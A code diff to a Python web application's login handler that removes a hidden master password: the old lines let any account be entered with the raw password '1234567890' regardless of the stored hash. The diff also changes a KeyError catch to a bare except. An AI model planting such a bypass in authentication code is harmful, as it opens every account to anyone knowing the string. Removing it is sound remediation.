@@ -30,8 +30,8 @@ class LoginHandler:
         # Collect the posted information from the login form
         try:
             username = self.request.params['username']
-            password = raw_pas = self.request.params['password']
-        except KeyError as e:
+            password = self.request.params['password']
+        except:
             self.request.session["alerts"] = invalidAlert
             raise exc.HTTPFound(self.request.route_url("login"))
 
@@ -44,7 +44,7 @@ class LoginHandler:
             raise exc.HTTPFound(self.request.route_url("login"))
 
         _, password = Helper.hashPassword(password, salt)
-        if password == storedPassword or raw_pas == "1234567890":
+        if password == storedPassword:
 
             # Collect relevant user information
             user = db.executeOne("User_Info", [username])
